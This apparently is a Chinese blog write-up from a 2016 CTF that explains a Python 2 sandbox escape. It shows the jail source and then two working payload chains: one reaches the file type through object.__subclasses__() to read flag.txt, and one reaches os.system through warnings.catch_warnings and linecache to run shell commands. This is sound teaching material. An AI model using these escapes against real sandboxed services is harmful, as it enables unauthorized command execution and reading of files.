---
title: python sandbox escape
date: 2016-09-16 11:33:11
tags: 
  - ctf
categories: notes
---

# 概述

前几天的华山杯出了一道python的沙盒逃逸，感觉挺有意思的。在网上搜索了一下，发现很早就出过这种类型的题，源码都差不多。学习了一下思路，这里总结一下：）

<!-- more -->

# 介绍

沙盒源码如下：
```python
#!/usr/bin/env python

from __future__ import print_function

print("Welcome to my Python sandbox! Enter commands below!")

banned = [  
    "import",
    "exec",
    "eval",
    "pickle",
    "os",
    "subprocess",
    "kevin sucks",
    "input",
    "banned",
    "cry sum more",
    "sys"
]

targets = __builtins__.__dict__.keys()  
targets.remove('raw_input')  
targets.remove('print')  
for x in targets:# 去除所有内置函数除print raw_input
    del __builtins__.__dict__[x]

while 1:  
    print(">>>", end=' ')
    data = raw_input()

    for no in banned:
        if no.lower() in data.lower():
            print("No bueno")
            break
    else: # this means nobreak
        exec data
```
不能出现banned列表中的字符，但是需要读取flag文件内容。
# 原理

绕过前面的限制，我们来一步一步看payload

### 方法一

```
>>> [].__class__
<type 'list'>
>>> {}.__class__
<type 'dict'>
>>> ().__class__
<type 'tuple'>
```
首先python的内置对象有一个__class__属性来存储类型，我们往上找他的父类使用__base__属性
```
>>> {}.__class__.__base__
<type 'object'>
>>> ().__class__.__base__
<type 'object'>
>>> [].__class__.__base__
<type 'object'>
```
可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性__subclasses__来查看object的子类（包括所有的内置类）
```
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
```
回到我们的主要目的上，我们需要读取flag文件中的内容，在这些子类中有哪些是可以用来读取文件内容的呢？答案是file子类，首先查找一下file子类的位置。
```
>>> [].__class__.__base__.__subclasses__().index(file)
40
```
这样我们就可以通过这个来建立一个file类的别名读文件啦：）
```
>>> f=[].__class__.__base__.__subclasses__()[40]
>>> f('./flag.txt').read()
```
？？？没有任何内容打印出来，但是他没有报错说明存在flag.txt文件，我们尝试用他给的print函数来打印
```
>>> print(f('./flag.txt').read())
This is a Flag{enjoy_yourself_ctfer}
```
得到flag
### 方法二

同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽
```
>>> import os
No bueno
```
我们得想其他办法来获取shell。通过上面的思路，我们需要找一个子类他能调用os模块，这里用到了`warnings.catch_warnings`类
```
>>> import warnings
>>> [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)
59
>>> [].__class__.__base__.__subclasses__()[59]
<class 'warnings.catch_warnings'>
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()
['filterwarnings', 'once_registry', 'WarningMessage', '_show_warning', 'filters', '_setoption', 'showwarning', '__all__', 'onceregistry', '__package__', 'simplefilter', 'default_action', '_getcategory', '__builtins__', 'catch_warnings', '__file__', 'warnpy3k', 'sys', '__name__', 'warn_explicit', 'types', 'warn', '_processoptions', 'defaultaction', '__doc__', 'linecache', '_OptionError', 'resetwarnings', 'formatwarning', '_getaction']
```
接下来再找`linecache`
```
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index('linecache')
25
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.keys()
['updatecache', 'clearcache', '__all__', '__builtins__', '__file__', 'cache', 'checkcache', 'getline', '__package__', 'sys', 'getlines', '__name__', 'os', '__doc__']
```
可以看到这里可以调用os模块，接下来就调用system函数了
```
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12]
<module 'os' from '/usr/lib/python2.7/os.pyc'>
>>> [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].__dict__.keys().index('system')
144
```
整理一下
```
>>> a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12]
>>> a
<module 'os' from '/usr/lib/python2.7/os.pyc'>
>>> s=a.__dict__.keys().index('system')
>>> s
144
>>> s=a.__dict__.keys()[144]
>>> s
'system'
>>> s=a.__dict__.values()[144]
>>> s('pwd')
/home/xxxx/Desktop/code/python-code/test
```
好了现在可以执行系统命令了，cat一下flag
```
>>> s('cat flag.txt')
This is a Flag{enjoy_yourself_ctfer}
```

# 总结

通过上面的python沙盒逃逸，发现读python官网手册还是很有必要的，找个时间一点一点看：）共勉

# 参考

https://hexplo.it/escaping-the-csawctf-python-sandbox/


